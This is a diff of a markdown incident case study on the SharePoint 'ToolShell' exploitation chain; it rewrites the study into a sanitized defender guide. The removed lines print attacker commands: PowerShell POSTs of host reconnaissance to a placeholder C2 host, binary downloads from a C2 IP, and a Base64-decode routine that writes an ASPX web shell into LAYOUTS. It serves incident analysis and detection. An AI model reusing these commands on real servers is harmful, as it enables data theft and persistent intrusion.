@@ -1,84 +1,148 @@
-# Case Study 001 - SharePoint ToolShell Exploitation Attempt (CVE-2025-49706, CVE-2025-53770, CVE-2025-49704)
+# Case Study 001 — SharePoint “ToolShell” Exploitation Attempt (Sanitized)
 
-> - **Severity:** High
-> - **Date:** July 2025
-> - **Framework:** MITRE ATT&CK - T1190 Exploit Public-Facing Application
+> **TL;DR**: Suspected post-exploitation activity on a SharePoint host: `w3wp.exe` spawning PowerShell/`cmd.exe`, host recon + cleartext exfil, staged binaries, and a probable ASPX web shell drop into **LAYOUTS**. No sensitive data or PoC code included.
 
+**Status:** Analyzed (July 2025)  
+**Severity:** High (post-exploitation behaviors observed)  
+**Surface:** SharePoint on IIS (`w3wp.exe`)  
+**Framework:** MITRE ATT&CK (primary: **T1190** – Exploit Public-Facing Application, with downstream techniques below)
 
-## Overview
-The SharePoint ToolShell vulnerabilities include a chain of critical flaws disclosed in 2025.
-- **[CVE-2025-49706](https://nvd.nist.gov/vuln/detail/CVE-2025-49706 "https://nvd.nist.gov/vuln/detail/CVE-2025-49706")** allows attackers to bypass authentication mechanisms.
-- **[CVE-2025-49704](https://nvd.nist.gov/vuln/detail/CVE-2025-49704 "https://nvd.nist.gov/vuln/detail/CVE-2025-49704")** enables arbitrary file writes, which can be leveraged to achieve remote code execution without valid credentials.
-- Two additional variants, **CVE-2025-53771** (derived from CVE-2025-49706) and [CVE-2025-53770](https://nvd.nist.gov/vuln/detail/CVE-2025-53770 "https://nvd.nist.gov/vuln/detail/CVE-2025-53770") (derived from CVE-2025-49704), were later identified through fuzzing research.
+---
 
-Together, these vulnerabilities present a high-risk attack surface where unauthenticated adversaries can gain full control of vulnerable SharePoint instances.
+## 1) Overview
 
-## Detection & Analysis
-- Initial alert triggered in **Stellar Cyber XDR** (High Severity).
-- **Correlated telemetry:** Microsoft Defender for Endpoint indicated `w3wp.exe` (IIS worker) spawning PowerShell and `cmd.exe` processes consistent with post-exploit activity.
+A chain of 2025 SharePoint issues dubbed “ToolShell” was publicly tracked:
 
-#### Observed behaviors:
-- **Recon & data exfil** via `Invoke-WebRequest` **HTTP POST** to external hosts:
-    
-    - `$(whoami /all)`, `$(systeminfo)`, `$(tasklist /v)`, `$(netstat -ano)`, directory listings of SharePoint and user profile paths.
-        
-- **Web app & SharePoint enumeration**:
-    
-    - `appcmd list app /text:[path='/'].physicalPath`, listings under `C:\inetpub\wwwroot\wss\VirtualDirectories\...` and `...\App_GlobalResources`.
-        
-- **Artifact download & drop** (cleartext HTTP):
-    
-    - EXE/DLLs fetched from external IPs/domains and saved under `C:\Users\[SERVICE_ACCOUNT]\AppData\Local\...` and `C:\ProgramData\...`.
-        
-- **Potential web shell deployment**:
-    
-    - **Decoded `-EncodedCommand` summary:** writes a **Base64-encoded ASPX file** to SharePoint **LAYOUTS** path as `spinstall0.aspx`:
-```
-$destinationFile = "C:\PROGRA~1\COMMON~1\MICROS~1\WEBSER~1\16\TEMPLATE\LAYOUTS\spinstall0.aspx"
-$decodedContent = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64String))
-$decodedContent | Set-Content -Path $destinationFile
-```
-→ This is consistent with **ToolShell-style web shell write** into a globally served SharePoint directory.
-- **Other signs**: creation of `0.css` in `App_GlobalResources` (write test / file-drop), and plaintext download of binaries (`SPDesk.exe`, `SPlog.exe`, `log.dll`, `Product.Wsc.dll`, `nvsmartmax64.dll`, `txmlutil.dll`).
+- **CVE-2025-49706** — auth bypass (enables unauthenticated reachability)  
+- **CVE-2025-49704** — arbitrary file write → potential RCE  
+- **CVE-2025-53770** — variant related to 49704 (fuzzing-derived)  
+- **CVE-2025-53771** — variant related to 49706
 
-#### Representative command patterns:
- ``` 
-# Exfil / recon
-powershell.exe -C Invoke-WebRequest -Uri hxxp://[C2_DOMAIN]/... -Method POST -Body $(whoami /all)
-powershell.exe -C Invoke-WebRequest -Uri hxxp://[C2_DOMAIN]/... -Method POST -Body $(systeminfo)
-powershell.exe -C Invoke-WebRequest -Uri hxxp://[C2_DOMAIN]/... -Method POST -Body $(netstat -ano)
-powershell.exe -C Invoke-WebRequest -Uri hxxp://[C2_DOMAIN]/... -Method POST -Body $(dir C:\inetpub\wwwroot\wss\VirtualDirectories)
+> Together, these elevated the risk of unauthenticated compromise on exposed SharePoint instances. (Links to vendor/NVD advisories in **References**.)
 
-# Artifact downloads
-powershell.exe -C Invoke-WebRequest -Uri hxxp://[C2_IP]:10888/asx -OutFile C:\Users\[SERVICE_ACCOUNT]\AppData\Local\WebTempDir\SPlog.exe
-powershell.exe -C Invoke-WebRequest -Uri hxxp://[C2_IP]:10888/2   -OutFile C:\Users\[SERVICE_ACCOUNT]\AppData\Local\log.dll
-powershell.exe -C Invoke-WebRequest -Uri hxxp://[C2_IP]:10888/3   -OutFile C:\Users\[SERVICE_ACCOUNT]\AppData\Local\Product.Wsc.dll
+**Assumptions:** Evidence is from a lab/controlled replication. Sensitive paths and network indicators are redacted; no runnable exploit code is provided.
 
-# SharePoint/IIS context
-w3wp.exe -ap "SharePointWebAppPools" ...
-cmd.exe /c C:\Windows\System32\inetsrv\appcmd.exe list app /text:[path='/'].physicalPath
+---
 
-# EncodedCommand (web shell write to LAYOUTS)
-cmd.exe /c powershell -EncodedCommand <BASE64>   # decodes and writes spinstall0.aspx to LAYOUTS
+## 2) Evidence & Observables (sanitized)
 
- ```
+**Telemetry sources**
+- XDR alert (High)
+- Defender for Endpoint process tree showing **`w3wp.exe` → `powershell.exe` / `cmd.exe`**
 
-#### Encoded Command:
+**Representative behaviors**
+- **Recon & exfil** (cleartext HTTP POST): `whoami /all`, `systeminfo`, `tasklist /v`, `netstat -ano`, and directory listings (SharePoint/IIS paths)
+- **App/IIS enumeration**: `appcmd list app ...`, listings under `C:\inetpub\wwwroot\wss\VirtualDirectories\...` and `...\App_GlobalResources\`
+- **Artifact staging**: EXE/DLL downloads over HTTP into `C:\Users\<svc>\AppData\Local\...` and `C:\ProgramData\...`
+- **Web shell write attempt**:
+  - Decoded `-EncodedCommand` writes **`spinstall0.aspx`** into SharePoint **LAYOUTS** (globally served)
+  - A `0.css` drop in `App_GlobalResources\` (likely write test/marker)
+
+**Screenshot**
 ![](attachments/POC-Decoded-Strings.png)
 
+---
 
-## Analysis Summary
-- The activity observed is consistent with post-exploitation of a SharePoint vulnerability. Adversaries leveraged `w3wp.exe` to spawn PowerShell and `cmd.exe` for:
+## 3) ATT&CK Mapping (high-level)
 
-- **Reconnaissance & Exfiltration** – collecting host details (`systeminfo`, `whoami`, `tasklist`, `netstat`) and directory listings, then exfiltrating results via cleartext HTTP POST to external C2 servers.
-    
-- **File Write & Payload Delivery** – downloading executables and DLLs into service account directories (`AppData\Local`, `ProgramData`), indicating attempts at persistence or staging.
-    
-- **Web Shell Deployment** – a Base64-encoded PowerShell payload decoded and wrote an ASPX file (`spinstall0.aspx`) into the SharePoint `LAYOUTS` directory, providing an accessible web shell for remote control.
-    
-- **SharePoint/IIS Enumeration** – commands targeting `appcmd.exe` and SharePoint resource directories, suggesting knowledge of SharePoint application structure.
-    
+- **Initial Access**: T1190 Exploit Public-Facing App (SharePoint)  
+- **Execution**: T1059.001 PowerShell; T1059 Cmd  
+- **Discovery**: T1082 System Info; T1057 Process Discovery; T1046 Network Service Scanning (inferred by `netstat`)  
+- **Collection/Exfiltration**: T1041 Exfiltration Over C2 Channel (HTTP)  
+- **Defense Evasion**: T1140 Deobfuscate/Decode (PowerShell `EncodedCommand`)  
+- **Persistence**: T1505.003 Server-Side Component (ASPX web shell in LAYOUTS)  
+- **C2**: T1071.001 Web Protocols (HTTP POST to external host)
 
-These behaviors demonstrate a multi-stage attack chain: 
-> **Initial Compromise** → **Host Reconnaissance** → **Data Exfiltration** → **Payload Deployment** → **Web Shell Installation for Persistence and Further Exploitation**.
+*(Exact sub-techniques depend on environment; mapping kept intentionally high-level.)*
 
+---
+
+## 4) Detection Opportunities (defender-centric, safe)
+
+> Use these as **hypotheses** or starting points—adapt to your SIEM/EDR telemetry model.
+
+**A. Process ancestry (IIS → PS/CMD)**  
+- Parent `Image` = `w3wp.exe` spawning `powershell.exe` or `cmd.exe`
+- PowerShell with `-EncodedCommand` or suspicious `WebRequest` usage
+
+**B. Suspicious file writes in SharePoint paths**  
+- New/modified `*.aspx` in:  
+  `C:\Program Files\Common Files\microsoft shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\`
+- Unexpected `*.css` or `*.aspx` under `...\App_GlobalResources\`
+
+**C. Cleartext outbound from server roles**  
+- HTTP/odd ports (e.g., `:10888`) from SharePoint hosts to external IPs/domains  
+- POST bodies containing `whoami/systeminfo/tasklist/netstat` outputs
+
+**D. IIS/SharePoint enumeration**  
+- `appcmd.exe list app` invoked by non-admin service context
+- Directory listings of `\VirtualDirectories\` soon followed by network POSTs
+
+**E. Staged binaries under service profiles**  
+- New EXE/DLL in `AppData\Local\` or `ProgramData\` tied to recent `w3wp.exe` activity
+
+> **Tip:** Combine A+B+C as a chained analytic for higher precision.
+
+---
+
+## 5) Response & Remediation
+
+**Immediate**
+- Quarantine or EDR isolate the affected host (maintenance window permitting)
+- Block egress to suspicious domains/IPs; capture full PCAP if available
+- Snapshot volatile data (process list, net connections, open handles), then acquire triage image
+
+**Hunt & Scope**
+- Search for additional `.aspx` drops in LAYOUTS and web app roots
+- Review IIS logs for anomalous requests to newly created pages
+- Trace similar `w3wp.exe → powershell.exe` trees across farm/cluster nodes
+
+**Hardening**
+- Apply vendor patches/advisories for CVE-2025-49706/49704 + variants
+- Enforce latest SharePoint CUs; restrict “write” permissions to app roots
+- Constrain PowerShell on servers (Constrained Language Mode, script block logging)
+- Web publishing best practices: WAF rules, request filtering, and disable legacy endpoints
+
+---
+
+## 6) Timeline (example)
+
+- **2025-07-xx** — Suspicious telemetry detected (XDR)  
+- **2025-07-xx** — Lab replication & artifact review  
+- **2025-07-xx** — Mitigations applied; indicators shared with SecOps
+
+*(Replace “xx” with your actual dates as disclosure allows.)*
+
+---
+
+## 7) Indicators (redacted placeholders)
+
+- **Paths**: `...\LAYOUTS\spinstall0.aspx`, `...\App_GlobalResources\0.css`  
+- **Processes**: `w3wp.exe` → `powershell.exe` / `cmd.exe`  
+- **Network**: `hxxp://<redacted_domain_or_ip>:10888/...` (HTTP POSTs)  
+- **Files**: `SPlog.exe`, `log.dll`, `Product.Wsc.dll`, `nvsmartmax64.dll`, `txmlutil.dll` (filenames only; treat as contextual)
+
+---
+
+## 8) References
+
+- NVD: CVE-2025-49706 — Authentication bypass (link to advisory)  
+- NVD: CVE-2025-49704 — Arbitrary file write → RCE (link to advisory)  
+- NVD: CVE-2025-53770 — Variant related to file write (link to advisory)  
+- CVE-2025-53771 — Variant related to auth bypass (tracking)  
+- MITRE ATT&CK: https://attack.mitre.org/
+
+> Replace with exact vendor/NVD links present in your internal notes.
+
+---
+
+## Appendix A — Decoded Strings (sanitized)
+*PowerShell `-EncodedCommand` contents summarized; raw strings withheld to prevent abuse.*
+
+![](attachments/POC-Decoded-Strings.png)
+
+---
+
+### Ethics & Disclosure
+
+This case study omits exploit code and sensitive identifiers and was prepared in line with responsible disclosure practices. The intent is to help defenders recognize and mitigate similar activity, not to enable misuse.
